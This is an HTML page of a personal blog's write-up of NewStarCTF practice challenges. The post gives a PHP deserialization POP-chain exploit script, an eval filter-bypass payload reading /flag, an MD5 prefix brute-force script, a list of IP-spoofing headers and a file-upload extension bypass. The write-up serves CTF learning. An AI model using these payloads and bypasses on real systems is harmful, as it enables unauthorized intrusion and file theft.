<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>buuåˆ·é¢˜ | ZmRzã®blog</title><meta name="author" content="ZmRz"><meta name="copyright" content="ZmRz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="rgba(255, 255, 255, 0.6)"><meta name="description" content="[NewStarCTF å…¬å¼€èµ›èµ›é“]UnserializeOne123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888">
<meta property="og:type" content="article">
<meta property="og:title" content="buuåˆ·é¢˜">
<meta property="og:url" content="https://www.zmrz.xyz/2025/07/10/buu%E5%88%B7%E9%A2%98/index.html">
<meta property="og:site_name" content="ZmRzã®blog">
<meta property="og:description" content="[NewStarCTF å…¬å¼€èµ›èµ›é“]UnserializeOne123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.zmrz.xyz/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%89%91-%E5%8F%A4%E9%A3%8E-%E5%BE%A1%E5%89%91%E9%A9%AD%E9%BE%99.png">
<meta property="article:published_time" content="2025-07-10T11:51:44.000Z">
<meta property="article:modified_time" content="2025-07-10T12:17:31.205Z">
<meta property="article:author" content="ZmRz">
<meta property="article:tag" content="çƒ­çˆ±">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.zmrz.xyz/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%89%91-%E5%8F%A4%E9%A3%8E-%E5%BE%A1%E5%89%91%E9%A9%AD%E9%BE%99.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "buuåˆ·é¢˜",
  "url": "https://www.zmrz.xyz/2025/07/10/buu%E5%88%B7%E9%A2%98/",
  "image": "https://www.zmrz.xyz/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%89%91-%E5%8F%A4%E9%A3%8E-%E5%BE%A1%E5%89%91%E9%A9%AD%E9%BE%99.png",
  "datePublished": "2025-07-10T11:51:44.000Z",
  "dateModified": "2025-07-10T12:17:31.205Z",
  "author": [
    {
      "@type": "Person",
      "name": "ZmRz",
      "url": "https://www.zmrz.xyz"
    }
  ]
}</script><link rel="shortcut icon" href="/images/wallpar%20(1).png"><link rel="canonical" href="https://www.zmrz.xyz/2025/07/10/buu%E5%88%B7%E9%A2%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'rgba(13, 13, 13, 0.6)')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'rgba(255, 255, 255, 0.6)')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶å¤±è´¥',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'å¤©',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'buuåˆ·é¢˜',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/footer.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/images/123.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%89%91-%E5%8F%A4%E9%A3%8E-%E5%BE%A1%E5%89%91%E9%A9%AD%E9%BE%99.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ZmRzã®blog</span></a><a class="nav-page-title" href="/"><span class="site-name">buuåˆ·é¢˜</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  è¿”å›é¦–é¡µ</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">buuåˆ·é¢˜</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2025-07-10T11:51:44.000Z" title="å‘è¡¨äº 2025-07-10 19:51:44">2025-07-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2025-07-10T12:17:31.205Z" title="æ›´æ–°äº 2025-07-10 20:17:31">2025-07-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%88%B7%E9%A2%98/">åˆ·é¢˜</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">æµè§ˆé‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="NewStarCTF-å…¬å¼€èµ›èµ›é“-UnserializeOne"><a href="#NewStarCTF-å…¬å¼€èµ›èµ›é“-UnserializeOne" class="headerlink" title="[NewStarCTF å…¬å¼€èµ›èµ›é“]UnserializeOne"></a>[NewStarCTF å…¬å¼€èµ›èµ›é“]UnserializeOne</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">\<span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">phpååºåˆ—åŒ–é¢˜ç›®</span><br><span class="line"></span><br><span class="line">popé“¾æ„é€ destruct----ã€‹call---&gt;<span class="keyword">clone</span>----&gt;tostring---&gt;invoke</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$res</span> = <span class="keyword">new</span> <span class="title class_">Start</span>;</span><br><span class="line"><span class="variable">$res</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Sec</span>;<span class="comment">//ç¬¬ä¸€æ¡é“¾</span></span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;obj = <span class="keyword">new</span> <span class="title class_">Easy</span>;<span class="comment">//ç¬¬äºŒæ¡é“¾</span></span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span>=<span class="keyword">new</span> eeee;<span class="comment">//ç¬¬ä¸‰æ¡é“¾</span></span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span>-&gt;obj=<span class="keyword">new</span> <span class="title class_">Start</span>;<span class="comment">//ç¬¬å››æ¡é“¾</span></span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span>-&gt;obj-&gt;func=<span class="keyword">new</span> <span class="title class_">Sec</span>;<span class="comment">//ç¬¬äº”æ¡é“¾</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]R!C!E!"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]R!C!E!</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_POST[&#x27;password&#x27;])&amp;&amp;isset($_POST[&#x27;e_v.a.l&#x27;]))&#123;</span><br><span class="line">  $password=md5($_POST[&#x27;password&#x27;]);</span><br><span class="line">  $code=$_POST[&#x27;e_v.a.l&#x27;];</span><br><span class="line">  if(substr($password,0,6)===&quot;c4d038&quot;)&#123;</span><br><span class="line">    if(!preg_match(&quot;/flag|system|pass|cat|ls/i&quot;,$code))&#123;</span><br><span class="line">      eval($code);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>å¯¹å‚æ•°passwordè¿›è¡Œmd5å¤„ç†ï¼Œæ£€æµ‹å…¶å‰6ä½æ˜¯å¦æ˜¯æ‰€éœ€è¦çš„å€¼ï¼Œä¹‹åå¯¹è¾“å…¥çš„å‘½ä»¤è¿›è¡Œäº†è¿‡æ»¤</p>
<p>è¿˜æœ‰â€-â€œè¢«è§£æä¸ºâ€ .â€isccç¢°è§è¿‡</p>
<p>ä½¿ç”¨[å³å¯(postä¼ å‚ç‰¹æ€§)</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704101644293.png" class="" title="image-20250704101644293">

<p>password&#x3D;USriMT35mYgUlenwusWV&amp;e[v.a.l&#x3D;echo(<code>more /fl\ag</code>);</p>
<p>exp</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md5</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        md5 = hashlib.md5(rnds.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> md5.hexdigest()[start: start+str_len] == substr:</span><br><span class="line">            <span class="built_in">print</span> (rnds)</span><br><span class="line">            stop_event.<span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = <span class="string">&quot;c4d038&quot;</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, <span class="number">0</span>))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure>

<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-EasyLogin"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-EasyLogin" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]EasyLogin"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]EasyLogin</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704104214430.png" class="" title="image-20250704104214430">

<p>æ˜¯ä¸ªç™»å½•ç³»ç»ŸæŠ“åŒ…çˆ†ç ´ï¼Œå¯†ç ä½¿ç”¨md5è¿›è¡ŒåŠ å¯†</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704104249692.png" class="" title="image-20250704104249692">

<p>è´¦æˆ·adminå¯†ç 000000</p>
<p>ç™»å½•æŠ“åŒ…</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704104321400.png" class="" title="image-20250704104321400">ç™»å½•è¿›å…¥ç•Œé¢å¾—åˆ°flag

<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-HTTP"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-HTTP" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of HTTP"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of HTTP</h1><p>æ ¹æ®æç¤ºæŠ“åŒ…ä¸€æ­¥ä¸€æ­¥è¿›è¡Œå³å¯</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704110328804.png" class="" title="image-20250704110328804">

<p>æœ€åä¸€æ­¥ä¿®æ”¹æœ¬åœ°ipåœ°å€å‘ç°å¸¸è§„X-Forwarded-For: 127.0.0.1æ— æ³•æˆåŠŸ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> 1 Client-IP:127.0.0.1</span><br><span class="line"> 2 Forwarded-For-Ip: 127.0.0.1</span><br><span class="line"> 3 Forwarded-For: 127.0.0.1</span><br><span class="line"> 4 Forwarded-For: localhost</span><br><span class="line"> 5 Forwarded:127.0.0.1</span><br><span class="line"> 6 Forwarded: localhost</span><br><span class="line"> 7 True-Client-IP:127.0.0.1</span><br><span class="line"> 8 X-Client-IP: 127.0.0.1</span><br><span class="line"> 9 X-Custom-IP-Authorization : 127.0.0.1</span><br><span class="line">10 X-Forward-For: 127.0.0.1</span><br><span class="line">11 X-Forward: 127.0.0.1</span><br><span class="line">12 X-Forward: localhost</span><br><span class="line">13 X-Forwarded-By:127.0.0.1</span><br><span class="line">14 X-Forwarded-By: localhost</span><br><span class="line">15 X-Forwarded-For-Original: 127.0.0.1</span><br><span class="line">16 X-Forwarded-For-original: localhost</span><br><span class="line">17 X-Forwarded-For: 127.0.0.1</span><br><span class="line">18 X-Forwarded-For: localhost</span><br><span class="line">19 X-Forwarded-Server: 127.0.0.1</span><br><span class="line">20 X-Forwarded-Server: localhost</span><br><span class="line">21 X-Forwarded: 127.0.0.1</span><br><span class="line">22 X-Forwarded: localhost</span><br><span class="line">23 X-Forwared-Host: 127.0.0.1</span><br><span class="line">24 X-Forwared-Host: localhost</span><br><span class="line">25 X-Host: 127.0.0.1</span><br><span class="line">26 X-Host: localhost</span><br><span class="line">27 X-HTTP-Host-Override : 127.0.0.1</span><br><span class="line">28 X-Originating-IP: 127.0.0.1</span><br><span class="line">29 X-Real-IP: 127.0.0.1</span><br><span class="line">30 X-Remote-Addr: 127.0.0.1</span><br><span class="line">31 X-Remote-Addr : localhost</span><br><span class="line">32 X-Remote-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªä¸€ä¸ªå®éªŒå‘ç° X-Real-IP: 127.0.0.1å¯ä»¥</p>
<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-Upload"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-Upload" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of Upload"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of Upload</h1><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>æ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆå°è¯•å‡ ä¸ªæ–‡ä»¶ä¸Šä¼ å›¾ç‰‡åæŠ“åŒ…æ›´æ”¹åç¼€å‘ç°ç›´æ¥èƒ½ä¼ å…¥</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704111246140.png" class="" title="image-20250704111246140">

